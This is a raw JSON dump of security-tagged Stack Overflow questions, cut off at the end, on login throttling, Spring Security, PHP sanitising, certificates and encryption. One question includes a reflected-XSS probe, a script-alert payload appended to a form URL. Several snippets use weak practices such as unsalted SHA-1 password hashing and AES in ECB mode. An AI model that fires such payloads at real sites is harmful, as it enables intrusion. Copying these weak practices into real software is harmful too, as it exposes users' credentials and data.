of the problem is that I am distributing the software and need to come up with an effective way and secure way of making sure both the server side know the <strong>IV</strong> and <strong>'Secret Key'</strong>. Right now the same string will always encrypt to be the same result. If I could change those two factors they would be different, so 2 users with the same password won't have the same encrypted password. Please do keep in mind that the server only needs to manage one account.</p>\n\n<p>I appreciate your responses, and thank you very much ahead of time!</p>\n"},{"tags":["security"],"answer_count":8,"favorite_count":4,"up_vote_count":12,"down_vote_count":0,"view_count":748,"score":12,"question_id":2786628,"title":"Preventing dictionary attacks on a web application","body":"<p>What's the best way to prevent a dictionary attack? I've thought up several implementations but they all seem to have some flaw in them:</p>\n\n<ol>\n<li>Lock out a user after X failed login attempts. Problem: easy to turn into a denial of service attack, locking out many users in a short amount of time.</li>\n<li>Incrementally increase response time per failed login attempt on a username. Problem: dictionary attacks might use the same password but different usernames.</li>\n<li>Incrementally increase response time per failed login attempt from an IP address. Problem: easy to get around by spoofing IP address.</li>\n<li>Incrementally increase response time per failed login attempt within a session. Problem: easy to get around by creating a dictionary attack that fires up a new session on each attempt.</li>\n</ol>\n"},{"tags":["spring","security","authentication","login","messages"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13261794,"title":"Display error messages in Spring login","body":"<p>I am using Spring security for authenticating users. I created a custom authentication provider and now I am wondering how I can get error messages from the provider into my form. This is the authenticate() method in my custom authentication provider:</p>\n\n<pre><code>@Override\npublic Authentication authenticate(Authentication authentication) throws AuthenticationException {\n    UserProfile profile = userProfileService.findByEmail(authentication.getPrincipal().toString());\n\n    if(profile == null){\n        throw new UsernameNotFoundException(String.format(\"Invalid credentials\", authentication.getPrincipal()));\n    }\n\n    String suppliedPasswordHash = DigestUtils.shaHex(authentication.getCredentials().toString());\n\n    if(!profile.getPasswordHash().equals(suppliedPasswordHash)){\n        throw new BadCredentialsException(\"Invalid credentials\");\n    }\n\n    UsernamePasswordAuthenticationToken token = new UsernamePasswordAuthenticationToken(profile, null, profile.getAuthorities());\n\n    return token;\n}\n</code></pre>\n\n<p>This is my form:</p>\n\n<pre><code>&lt;form name='f' action=\"&lt;c:url value='j_spring_security_check' /&gt;\" method='POST'&gt;\n&lt;div id=\"data-entry-form\"&gt;\n\n    &lt;div class=\"form-entry\"&gt;\n        &lt;label&gt;&lt;spring:message code=\"login.form.label.email\"/&gt;&lt;/label&gt;\n        &lt;input type='text' name='j_username' value=''&gt;\n    &lt;/div&gt;\n    &lt;div class=\"form-entry\"&gt;\n        &lt;label&gt;&lt;spring:message code=\"login.form.label.password\"/&gt;&lt;/label&gt;\n        &lt;input type='password' name='j_password'/&gt;\n    &lt;/div&gt;\n    &lt;div class=\"form-entry\"&gt;\n        &lt;input type=\"submit\" value=\"Verzenden\"/&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p></p>\n\n<p>How would I get error messages into my form? From the moment I press the login button, Spring takes over, so the only method I could generate error messages in would be the authenticate() method...</p>\n"},{"tags":["ios","security","passwords","keychain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12437027,"title":"Password in keychain - and people forgetting their password","body":"<p>I have an iOS App that may store confidential information and also uses iCloud to synchronize its Core Data between devices (the data itself is encrypted inside Core Data).</p>\n\n<p>People can protect the App with a password, and can also create two secret questions to help them recover a lost password.</p>\n\n<p>The password and secret questions are kept in the keychain.</p>\n\n<p>Quite often I get support requests that say \"Hey, I forgot my password and I also forgot the answers to my secret questions, so now I cannot access my precious data. Please help\".</p>\n\n<p>Some people also say that they tried to remove the App and re-install it (knowing that the data will be re-synched from iCloud), assuming that this will reset their password, which of course does not happen.</p>\n\n<p>Currently there's no way for me to help these people.</p>\n\n<p>Now here's the question.</p>\n\n<p>On one hand, it's very easy for me to clear the password and secret questions from the keychain on first launch, so that people can create a new one if they remove and re-install the App.</p>\n\n<p>However, this seems to create a security hole. An unauthorized person getting hold of the device can remove the App, re-install it, create a new password, let the App synchronize with iCloud and access the confidential data.</p>\n\n<p>I believe that there are many more innocent people who forget their passwords than people trying to steal other people's data, but I still feel reluctant to go \"the easy way\".</p>\n\n<p>What do you think?</p>\n"},{"tags":["c++","security","fuzzing","fuzzer","fuzz-testing"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":7,"view_count":50,"score":-7,"question_id":13261011,"title":"Writing a Fuzzing Framework in C++","body":"<p>I have to start writing a fuzzer framework from scratch in C++, no design or functionality documentation is in place. Any inputs?</p>\n"},{"tags":["security","node.js"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13259896,"title":"Node.JS switch user while running","body":"<p>Is it possible for a Node.JS program that is running as root, to downgrade its authority while it is running? This would be one of the first things it does, and the purpose is of course to limit possible damage it could cause, in the unlikely event that there is a vulnerability, or mis-trusted code that runs in this process.</p>\n\n<p>Alternatively, is there a way for Node.JS process that is running as root, to start a separate process which is non-root? (preferably without adding a layer in between, such as sudo)</p>\n"},{"tags":["php","security","xss","sql-injection"],"answer_count":10,"favorite_count":162,"up_vote_count":206,"down_vote_count":0,"view_count":69860,"score":206,"question_id":129677,"title":"What's the best method for sanitizing user input with PHP?","body":"<p>Is there a catchall function somewhere that works well for sanitizing user input for sql injection and XSS attacks, while still allowing certain types of html tags?</p>\n"},{"tags":["spring","security","roles","rights","authority"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13220149,"title":"How do roles and rights translate to Spring Security?","body":"<p>In my applications I usually create three tables for access management. Roles, Rights and an association table that maps between Roles and Rights.</p>\n\n<p>I am trying to translate this approach to Spring security and after reading [this article][1] I thought I was on the right track. I created a custom AuthenticationProvider and implemented the <code>authenticate()</code> method like so:</p>\n\n<pre><code>@Override\npublic Authentication authenticate(Authentication authentication) throws AuthenticationException {\n    UserProfile profile = userProfileService.findByEmail(authentication.getPrincipal().toString());\n\n    if(profile == null){\n        throw new UsernameNotFoundException(String.format(\"Invalid credentials\", authentication.getPrincipal()));\n    }\n\n    String suppliedPasswordHash = DigestUtils.shaHex(authentication.getCredentials().toString());\n\n    if(!profile.getPasswordHash().equals(suppliedPasswordHash)){\n        throw new BadCredentialsException(\"Invalid credentials\");\n    }\n\n    UsernamePasswordAuthenticationToken token = new UsernamePasswordAuthenticationToken(profile, null, profile.getAuthorities());\n\n    return token;\n}\n</code></pre>\n\n<p>The <code>profile.getAuthorities()</code> method creates a list of Rights (rights are wrapped in my own implementation of GrantedAuthority).  So, the UsernamePasswordAuthenticationToken object is created with this list. This is the UserProfile.getGrantedAuthorities() method that takes care of this:</p>\n\n<pre><code>public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() {\n    Set&lt;ProduxAuthority&gt; authorities = new HashSet&lt;ProduxAuthority&gt;();\n    for (Role role : roles) {\n        for (Right right : role.getRights()) {\n            ProduxAuthority produxAuthority = new ProduxAuthority(right.getName());\n            authorities.add(produxAuthority);\n        }\n    }\n    return authorities;\n}\n</code></pre>\n\n<p>My question is whether this is a correct approach. I am getting the impression that I should stuff roles into GrantedAuthorities instead of rights, but I would like to use rights to secure methods and urls, because it gives me more fine grained control  over authorization. How would I accomplish this? And what is the difference between a ROLE and a PERMISSION in Spring? Do permissions map to rights and could I use hasPermission() to secure stuff bases on rights instead of roles? </p>\n"},{"tags":["java","web-services","security","encryption","md5"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13234013,"title":"String decryption for webservice","body":"<p>I have a web service (Java) which requires a password for all cases. But the password must be come to me securely. Is there a standard way for all platforms -> java encryption/decryption. How can I decrypt a string which could come a random platform(php,.net,iPhone).</p>\n"},{"tags":["ajax","json","security","html-entities"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":13236415,"title":"Security benefits of encoding HTML special characters in JSON responses","body":"<p>I have recently received a recommendation, from a third party, to encode HTML special characters in all server responses \"for security reasons\". So:</p>\n\n<pre><code>' --&gt; &amp;#x27;\n&amp; --&gt; &amp;#x26;\n</code></pre>\n\n<p>e.g.</p>\n\n<pre><code>{ \"id\": 1, \"name\": \"Miles O&amp;#x27;Brien\" }\n</code></pre>\n\n<p>Question: Is there a security gain in doing this, or is it just a paranoia?</p>\n"},{"tags":["php","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":56,"score":0,"question_id":13247997,"title":"$_SERVER['PHP_SELF'] vulnerability not \"working\"?","body":"<p>Looking at an old code of a client, he's using</p>\n\n<pre><code>&lt;form action=\"&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;\" /&gt;\n</code></pre>\n\n<p>I was wondering if it was subject to XSS, but when I try :</p>\n\n<ul>\n<li><code>form.php\"&gt;&lt;script&gt;alert('xss');&lt;/script&gt;</code> => 404 NOT FOUND from Apache</li>\n<li><code>form.php/\"&gt;&lt;script&gt;alert('xss');&lt;/script&gt;</code> => 404 From my app</li>\n</ul>\n\n<p>I must specify that I also use ?action=specific_page in the url for its normal use.</p>\n\n<p>Does that mean no XSS is possible using <code>PHP_SELF</code> or does that mean I'm trying it the wrong way?</p>\n"},{"tags":["facebook","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":5,"score":0,"question_id":13256680,"title":"Which User Privacy/Security Settings can be accessed via the Facebook API?","body":"<p>I want to be able to display a users Facebook privacy settings in a third party application (the user would provide FB login details to that application).</p>\n\n<p>Is this possible? I don't want to be able to change any settings, just display them.</p>\n\n<p>Also, is the same possible for Albums i.e. get a list of public/private albums?</p>\n\n<p>Thanks.</p>\n"},{"tags":["windows","security","events","source"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":13,"score":0,"question_id":13256537,"title":"Windows Event Log - How to register a Security event source Programmatically?","body":"<p>i want to register a 'security' event source and unregister that to generate log with event id -4904 and 4905 respectively, to test my application. how can i do so?</p>\n"},{"tags":["wcf","security","certificate"],"answer_count":5,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":7307,"score":5,"question_id":1701437,"title":"WCF service certificate and client side endpoint identity - why it doesn't work?","body":"<p>[Update] - I attach also full config files, for <a href=\"http://gist.github.com/230024\">service</a>, and for <a href=\"http://gist.github.com/230026\">client</a> (outside of here, not to flood the topic)</p>\n\n<p>I'm having situation pretty much identical to the one outlined in <a href=\"http://stackoverflow.com/questions/1577115/wcf-service-certificate-implications-of-certificatevalidationmodenone-and-revo\">this</a> question, however my question is somewhat different.</p>\n\n<ul>\n<li>I'm using NetTcpBinding with security\nset to TransportWithMessageCredential</li>\n<li>I'm using Password/Username\ncredentials backed up by ASP.NET\nprovider</li>\n<li>My service is self hosted in Windows\nService</li>\n<li>I <strong>do</strong> have in my endpoint behavior\nspecified authentication\nrevocationMode=\"NoCheck\"</li>\n</ul>\n\n<p>It is required that the service provides a certificate to authenticate itself to clients. That's OK, I just do:</p>\n\n<pre><code>&lt;serviceCertificate findValue=\"***\"\n                    storeLocation=\"CurrentUser\"\n                    storeName=\"My\"\n                    x509FindType=\"FindByThumbprint\"/&gt;\n</code></pre>\n\n<p>Now, I somewhat imagined that now the client would end up having</p>\n\n<pre><code>&lt;identity&gt;\n  &lt;certificate encodedValue=\"encoded certificate\"/&gt;\n&lt;/identity&gt;\n</code></pre>\n\n<p>And it will be able to verify service's credentials <strong>without having that certificate installed in the store on client machine</strong>.</p>\n\n<p>I was surprised <a href=\"http://msdn.microsoft.com/en-us/library/ms733130.aspx\">to learn</a> that although I set the service credentials to certificate, <a href=\"http://en.wikipedia.org/wiki/Web%5FServices%5FDescription%5FLanguage\">WSDL</a> exposes </p>\n\n<pre><code>&lt;Identity&gt;\n   &lt;Dns&gt;Foo&lt;/Dns&gt;\n&lt;/Identity&gt;\n</code></pre>\n\n<p>Again, on service I can set Identity to CertificateReference and hook it up to the same certificate, and then WSDL will expose identity as X509Certificate, but when I run the client that setting is ignored, and I end up with error message:</p>\n\n<blockquote>\n  <p>System.ServiceModel.Security.SecurityNegotiationException:\n  The X.509 certificate CN=xxx is not in\n  the trusted people store. The X.509\n  certificate CN=xxx chain building\n  failed. The certificate that was used\n  has a trust chain that can not be\n  verified. Replace the certificate or\n  change the certificateValidationMode.\n  A certificate chain processed, but\n  terminated in a root certificate which\n  is not trusted by the trust provider.</p>\n</blockquote>\n\n<p>Is there a way to make client use that value from config and work without having to install a service certificate (nor its root) on client' machine?</p>\n\n<p><strong>[UPDATE]</strong>\nWhile setting certificateValidationMode to none will make the exception go away, it is unacceptable solution from security point of view.</p>\n\n<p>It makes the client merely acknowledge that it receive ''some'' certificate, without getting into details. This makes all range of man in the middle attacks possible. It still won't validate the information sent by (alleged) service against the certificate dumped in the config.</p>\n"},{"tags":["security","google-app-engine","http"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":55,"score":2,"question_id":13245540,"title":"Google App Engine: secure inter-app communication","body":"<p>I have two apps on Google App Engine, both running under the same account, and one invokes services provided by the other over HTTPS. What is the recommended way of ensuring that only the first app is permitted to invoke the second? </p>\n\n<p>Alternatively, is there a way to specify that given endpoint can only be invoked by an app running under the same GAE account?</p>\n"},{"tags":["iphone","ios","ipad","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13254309,"title":"Is it possible to automatically launch my Enterprise sapp every time after iPad booted?","body":"<p>I'm researching a way to automatically launch my enterprise app every time after my iPad booted.</p>\n\n<p><strong>I need to setup a iPad device only for my Enterprise application</strong>. Example, same as ATM machines in india. ATM machines background is window machine and they are running the Transaction application always after the machine booted and they will never allow to quit the app. Only way to quit the app is \"switched off\"</p>\n\n<p>I found a good way to <strong>disable</strong> the iPad <strong>Home button</strong> functionality through <a href=\"http://joris.kluivers.nl/blog/2012/03/02/kiosk-mode-for-ios/\" rel=\"nofollow\"><strong>Kiosk Mode for iOS</strong></a></p>\n\n<p>Its working fine for me, however now i need to launch my Enterprise app every time manually after the reboot of iPad.</p>\n\n<p>So is it possible automatically launch my Enterprise app every time after iPad booted without jail-breaking?</p>\n\n<p>Will Apple-Store reject my application if I implement the behavior?</p>\n"},{"tags":["java","security","encryption","bouncycastle"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":13248851,"title":"I encrypt data with 32 byte length using AES algorithm the result(cipher text) is 64 byte length,Is this valid?","body":"<p>I implement this via java , BouncyCastle Provider\nuse Block mode = ECB and Padding mode = PKCS7Padding</p>\n\n<p>I noticte that if i encrypt data that has 32 byte length(such as 61626162616261626162616261626162 which is hex value of abababababababab) i get 64 bytes length cipher text(f21ee0564ebd5274e10bf4590594b1e16a19592b917b19ee106f71d41d165289) is this cipher text valid? from what i read it look like if you encrypt less than 32 byte length data the algorithm will padding it to 32 byte length and produce a 32 byte length cipher text but if you put in exactly 32 byte length data shouldn't you receive the 32 byte length cipher text ,also if i put in data with more length than 32 byte it will padded to 64 byte cipher text correctly</p>\n\n<p>this is what my code look like :</p>\n\n<pre><code>    public static byte[] encrypt(byte[] plainText, byte[] keyBytes)\n        throws GeneralSecurityException {\n\n    SecretKeySpec key = new SecretKeySpec(keyBytes, \"AES\");\n\n    Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS7Padding\", \"BC\");\n    cipher.init(Cipher.ENCRYPT_MODE, key);\n\n    byte[] cipherText = cipher.doFinal(plainText);\n\n    return cipherText;\n}\n</code></pre>\n\n<p>thx for your reply</p>\n"},{"tags":["c#",".net","security","service","windows-services"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13253166,"title":"How to start a windows service from other machines?","body":"<p>I have some windows services writtin with C# language that is running on my machine. I also created a WPF Application to my customer start and stop theses services. When I run it on the same machine, it works fine, but when I try to run on other machines it does not work, and I got an exception with the message: <em>Cannot open Service Control Manager on compupter 'NAME-PC'. This operation might require other privileges.</em></p>\n\n<p>My Windows Service has a Project Installer that has a ProcessInstaller with the Account property setted to <em>LocalSystem</em>.  I'm not sure if that influence.</p>\n\n<p>How could I set the right privileges to other machines can start this service on a specific machine?</p>\n\n<p>Thank you.</p>\n"},{"tags":["c#","security","embed","ironpython"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":99,"score":1,"question_id":10775746,"title":"Embedded IronPython Security","body":"<p>I am embedding IronPython into my game engine, where you can attach scripts to objects. I don't want scripts to be able to just access the CLR whenever they want, because then they could pretty much do anything.</p>\n\n<p>Having random scripts, especially if downloaded from the internet, being able to open internet connections, access the users HDD, or modify the internal game state is a very bad thing.</p>\n\n<p>Normally people would just suggest, \"Use a seperate AppDomain\". However, unless I am severely mistaken, cross-AppDomains are slow. Very slow. Too slow for a game engine. So I am looking at alternatives.</p>\n\n<p>I thought about compiling a custom version of IronPython that stops you from being able import clr or any namespace, thus limiting it to the standard library.</p>\n\n<p>The option I would rather go with goes along the following lines:</p>\n\n<pre><code>__builtins__.__import__ = None #Stops imports working\nreload = None #Stops reloading working (specifically stops them reloading builtins\n          #giving back an unbroken __import___!\n</code></pre>\n\n<p>I read this in another stack overflow post.\nAssume that instead of setting __ builtins_<em>.</em>_ import__ to none, I instead set it to a custom function that lets you load the standard API.</p>\n\n<p>The question is, using the method outlined above, would there be any way for a script to be able to be able to get access to the clr module, the .net BCL, or anything else that could potentially do bad things? Or should I go with modifying the source? A third option?</p>\n"},{"tags":["php","security","gif"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13250471,"title":"GIF/Jpeg File containing PHP code","body":"<p>Testing a web application, I can upload GIF/Jpeg files and I know there is a possible threat when including PHP Code properly in that GIF/Jpeg (because it is modified using <a href=\"http://php.net/imagecreatetruecolor\" rel=\"nofollow\">imagecreatetruecolor</a> and <a href=\"http://php.net/imagejpeg\" rel=\"nofollow\">imagejpeg</a>).</p>\n\n<p>I was looking for an existing GIF file containing a simple PHP code (like phpinfo or echo 'hello world') just to validate that the threat was concrete.</p>\n\n<p>What would be perfect is a specifically crafted GIF image containing PHP Code in the middle OR in the palette color, but I was unsuccessful to find one.</p>\n\n<p>Thanks for your help!</p>\n"},{"tags":["iphone","objective-c","ios","security","sandbox"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":1,"view_count":58,"score":2,"question_id":13248496,"title":"Can attackers defeat iOS keychain and data-protection encryption?","body":"<p>I am developing an iOS app that it has to store username and password and other sensitive data. I am considering using NSUserDefaults or keychain storage. \nAre there other more secure method to keep attackers from defeating iOS keychain or such data protection? </p>\n"},{"tags":["image","security","upload","permissions","username"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13250126,"title":"naming uploaded image after username?","body":"<p>I am developing using CodeIgniter framework.</p>\n\n<p>I have an image upload folder which permission is set to 755. My host is using suPHP so site users are able to upload to it.</p>\n\n<p>I just noticed that when user uploads an image, the IMAGE file permission is 666.</p>\n\n<p>I am naming the images using usernames so it would be quite easy for someone to guess that someone with username hello would have an image stored in that directory named hello.jpg or hello.png</p>\n\n<p>Is this unsafe? Could a malicious visitor do something like erase or replace a members image from that image upload directory?</p>\n\n<p>Do I have to name the image something random and then store that random image name into that users db table row so I know which image name matches which user?</p>\n"},{"tags":["android","web-services","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13249262,"title":"android access to secure web service","body":"<p>I have JAVA web service and I try to access to this web service from android phone with KSOAP2 library. It works perfect without SSL, but I want to secure web service with SSL. I use tomcat server and I've installed https and create certificate successfully. \nNow starts my problem. When I tried to access to my secure web service from Android, I have a problem. I find some solution how to access with KSOAP library to web service and I find some related topic here.</p>\n\n<p><a href=\"http://stackoverflow.com/questions/9601288/how-to-consume-https-rest-service-from-android-application\">How to consume HTTPS rest service from android application</a></p>\n\n<p>It gives me the following exceptions:</p>\n\n<pre><code>11-06 10:56:39.706: W/System.err(2037): SoapFault - faultcode: 'wsse:InvalidSecurity' faultstring: 'Security Requirements not met - No Security header in message' faultactor: 'null' detail: org.kxml2.kdom.Node@41021c18\n\n11-06 10:56:39.706: W/System.err(2037): at \norg.ksoap2.serialization.SoapSerializationEnvelope.parseBody(SoapSerializationEnvelope.java:141)\n</code></pre>\n\n<p>etc..</p>\n\n<p>Does exist some functional solution for secure communication with a web service?</p>\n"},{"tags":["security","codeigniter","directory","traversal","sanitize"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13248849,"title":"CodeIgniter - Directory Traversal - sanitize_filename()","body":"<p>If I use the CodeIgniter File Upload Class and rename the image being uploaded using:</p>\n\n<p><code>$config['file_name']</code></p>\n\n<p>do I still have to use</p>\n\n<p><code>$this-&gt;security-&gt;sanitize_filename()</code></p>\n\n<p>on the image being uploaded by user?</p>\n"},{"tags":["security","shell","operating-system"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":13249021,"title":"stack & heap overflow exploits are no more effective?","body":"<p>Do all new OSes implement the <a href=\"http://en.wikipedia.org/wiki/NX_bit\" rel=\"nofollow\"><code>no execute bit</code></a> in order to overcome vulnerabilities that could be used to execute malicious code? for example, is it implemented in <code>Win7</code>? Do that mean that the <strong>traditional way</strong> of stack &amp; heap overflow exploits are no more effective?  </p>\n"}]}
{"total":17772,"page":2,"pagesize":100,"questions":[{"tags":["algorithm","web-services","security","verification"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13249066,"title":"Verifiying answers from application to web service and vice versa","body":"<p>Scenario:</p>\n\n<p>My Application stands in connection to Web service (Master Server). Sometimes i make calls like <strong>login on application startup</strong>, where my application sents user credentials to the master server for validating.</p>\n\n<p>So, how do i <strong>1st</strong> validate that the answer is from my <strong>real</strong> server and not a fake local webserver with routed hosts file? And <strong>2nd</strong> how do i parse this answer?</p>\n\n<p>I always parsed like this (dummy code):</p>\n\n<pre><code>if($answerFromWebserver == \"LOGIN_OK\") {\n    doLogin();\n}\n</code></pre>\n\n<p>Are there better, more safe solutions?</p>\n"},{"tags":["asp.net-mvc","security","authentication","authorization"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13249134,"title":"Performing custom authentication with authenticated domain users","body":"<p>I am aware this has been asked ad-infinitum but I am bing overwhelmed with solutions and nothing seems to work.</p>\n\n<p>My problem is a common one but I can't seem to get it to work or I am missing something.</p>\n\n<ul>\n<li>ASP.NET MVC4 </li>\n<li>Windows Authentication with User list and roles in DB</li>\n<li>Intranet website</li>\n</ul>\n\n<p>All employees are on the same domain so with Windows authentication, they are all <code>IsAuthenticated = true;</code> but only some are allowed to use this website. Those users are in a database with a list of roles so I take the domain Id of the current user, check if it exists in the db. If not then I set <code>IsAuthenticated</code> to false and route to appropriate page. If user exists I retrieve user details and want to se the <code>HttpContext.Current.User</code> to my custom Principal. So I need custom authentication and authorization. I want to performa authentication against the db once and only once.</p>\n\n<p>After authentication I will be performing authorization on a per controller, per action basis.</p>\n\n<p>I've read a <em>lot</em> online and can't seem to see the wood for the trees.</p>\n\n<p>Currently I have a custom AuthorizeAttribute overriding AuthorizeCore, I hit the db, do my authentication, then set tje HttpContext.Current.User to my custom Principal but on subsequent requests, I can't access this custom Principal, only the windowsPrincipal (because all users are on the same domain and are authenticated).</p>\n\n<pre><code>override protected bool AuthorizeCore(HttpContextBase httpContext_)\n{\n    var authorized = base.AuthorizeCore(httpContext_);\n\n    if(!authorized) { return false; }\n\n    // authenticate against the db\n    // CurrentPrincipal is a static property returning Thread.CurrentPrincipal\n    // subsequent requests return null for this CurrentPrincipal ??\n    if (MyPrincipal.CurrentPrincipal == null)\n    {\n        var cachedUser = new MyEFContext().Users\n            .Where(user_ =&gt;\n                user_.ADName == HttpContext.Current.User.Identity.Name &amp;&amp;\n                !user_.IsDeleted &amp;&amp;\n                !user_.IsDisabled)\n                .FirstOrDefault();\n\n        // SetCurrent is a static method \n        // It takes the cachedUser entity and creates a new MyCustom Principal with it\n        // and then sets the Thread.CurrentPrincipal\n        // and the HttpContext.Current.User to that custom Principal\n        MyPrincipal.SetCurrent(cachedUser);\n\n                    // below commented out but I have also tried the below\n                    //httpContext_.User = MyPrincipal.CurrentPrincipal;\n    }\n\n    // authorise\n    var isAllowed = false;\n    if (!string.IsNullOrEmpty(Roles))\n    {\n        isAllowed  = Roles == DSTPrincipal.CurrentPrincipal.AuthenticatedUser.Role;\n    }\n\n    return MyPrincipal.CurrentPrincipal != null \n        &amp;&amp; MyPrincipal.CurrentPrincipal.Identity.IsAuthenticated \n        &amp;&amp; (!string.IsNullOrEmpty(Roles) &amp;&amp; isAllowed);\n}\n</code></pre>\n\n<ol>\n<li>Where should I perform custom authentication against my db? I used to do it in Global.asax.cs or in a custom HttpModule using the AuthenticateRequest event.</li>\n<li>Is my custom AuthorizeAttribute the correct approach? Doing authenticationa and authorisation here doesn't feel right.</li>\n<li>I want to cache my custom principal so on subsequent calls I don't have to hit the db and I have access to other custom principal properties.</li>\n</ol>\n\n<p>Apologies if I am not coherent in my request. If you have any Qs then please let me know and I will try to improve my question.</p>\n\n<p>Thanks for any help and advice.</p>\n"},{"tags":["android","security"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":17,"score":1,"question_id":13248481,"title":"Settings.Secure.ANDROID_ID always the same on each device","body":"<p>I'm facing a big problem with my low cost tablets from China. Serial number is the same, device id from telephony is the same and now I discover that also Settings.Secure.ANDROID_ID is the same on each device.</p>\n\n<p>How Settings.Secure.ANDROID_ID is generated?</p>\n"},{"tags":["actionscript-3","flex","security","soap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13248776,"title":"Channel.Security.Error in Flex application","body":"<p>I have a Flex application running on several domains (HTTP). The application communicates with the server using, among other things, WSDL service that resides on HTTPS.</p>\n\n<p>For reasons unknown (to me), <em>sometimes</em> I see a log entry that tells me something like this:</p>\n\n<p><code>[FaultEvent fault=[RPC Fault faultString=\"Sikkerhetsfeil ved tilgang til URL-adresse\" faultCode=\"Channel.Security.Error\" faultDetail=\"Ml: DefaultHTTP\"] messageId=\"D2B72EF4-65FD-4A36-6117-D4DC95E63E01\" type=\"fault\" bubbles=false cancelable=true eventPhase=2]</code></p>\n\n<p>I managed to deduce from looking this error up on that it has something to do with SOAP calls.\nI tried applying some extra entries to the <code>crossdomain.xml</code> based on <a href=\"http://dotanything.wordpress.com/2008/08/11/flex-security-error-accessing-url-or-channelsecurityerror/\" rel=\"nofollow\">this info</a>, but it didn't really help.\nThe current content of the crossdomain.xml is as follows:</p>\n\n<pre><code>&lt;cross-domain-policy&gt;\n&lt;site-control permitted-cross-domain-policies=\"all\"/&gt;\n&lt;allow-access-from domain=\"*\" secure=\"false\"/&gt;\n&lt;allow-http-request-headers-from domain=\"*\" headers=\"*\" secure=\"false\"/&gt;\n&lt;/cross-domain-policy&gt;\n</code></pre>\n\n<p>The most maddening thing is that this error only occurs very sporadically, and is not consistent in any immediately recognizable way.</p>\n\n<p>Anyone? A clue as to why could this be happening?</p>\n"},{"tags":["security","active-directory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13240407,"title":"Secure individual attributes in Active Directory","body":"<p>I want to empower our users to edit their phone numbers (home/mobile/work) in Active Directory. What I would like to know if it is possible to have all other attributes in AD secured and read-only, while allowing users to update just this one field? That is, can I alter AD security on a per-attribute basis?</p>\n\n<p>I've tried googling and searching MSDN answers for pointers, but the concepts and keywords I'm coming up with are too general to get good results.</p>\n"},{"tags":["php","security","paypal"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":13246581,"title":"How to secure data that needs to be used raw","body":"<p>I have an application that needs securing. The data is data from Paypal that allow me to charge people (if they have approved me), something I want to make sure before I launch this feature on my site is, its secure.</p>\n\n<p>I know with passwords you can use salts and 1 way hashing, but as this data needs to be used in its raw format I'm wondering of ways I can store this data.</p>\n\n<p>The data will not be available to the users or me, but It will be stored in a database and I'm wanting to make it so if the database gets hacked then there is nothing of 'value'.</p>\n\n<p>Can anyone offer me any advice or solutions to my problem?</p>\n"},{"tags":["java","android","security","encryption","obfuscation"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":13243272,"title":"Encrypting Android code?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/7187883/how-to-encrypt-a-jar-file\">How to encrypt a .jar file</a>  </p>\n</blockquote>\n\n\n\n<p>I know obfuscation but what it does is only to make the code harder to understand. It doesn't really encrypt the code. Is there a way to encrypt Android code? Or is there any alternative to make the code more irrecoverable when decompiled?</p>\n\n<p>I am asking this question to know if what I'm looking for is possible. Right now, my mind suggest that it is impossible to encrypt the code since if we encrypt it, Dalvik also won't be able to understand the code and run it. But I'm not really sure about it. It is possible that I didn't know something.</p>\n\n<p>Please post what do you think about this or if you have any suggestions? Also, please consider a financial application wherein having access to a human readable code means being able to understand the flow of the financial process going-on on the backend. Thank you!</p>\n"},{"tags":["javascript","security","encryption","twitter","passwords"],"answer_count":11,"favorite_count":1,"up_vote_count":8,"down_vote_count":1,"view_count":8396,"score":7,"question_id":38838,"title":"Two-way password encryption without ssl","body":"<p>I am using the <a href=\"http://apiwiki.twitter.com/\" 